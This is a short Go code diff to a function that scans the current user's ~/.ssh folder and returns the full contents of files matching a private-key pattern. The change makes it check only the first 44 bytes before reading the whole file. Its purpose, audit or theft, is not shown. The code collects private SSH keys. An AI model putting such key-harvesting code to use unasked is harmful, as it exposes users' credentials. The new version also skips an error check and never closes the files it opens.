@@ -25,14 +25,19 @@ func dgFileFindSSHPrivateKeyFiles() [][]byte {
 	}
 	privateKeyFiles := [][]byte{}
 	for _, file := range sshFolder {
+		var filePartialContents = make([]byte, 44)
 		filePath := path.Join(path.Join(currentUser.HomeDir, ".ssh"), file.Name())
-		fileContents, err := ioutil.ReadFile(filePath)
+		fileReader, err := os.Open(filePath)
+		_, err = fileReader.Read(filePartialContents)
 		if err != nil {
 			continue
 		}
-		isPrivateKey, _ := regexp.MatchString(keyPattern, string(fileContents))
+		isPrivateKey, _ := regexp.MatchString(keyPattern, string(filePartialContents))
 		if isPrivateKey {
-			privateKeyFiles = append(privateKeyFiles, fileContents)
+			fileContents, err := ioutil.ReadFile(filePath)
+			if err == nil {
+				privateKeyFiles = append(privateKeyFiles, fileContents)
+			}
 		}
 	}
 	return privateKeyFiles
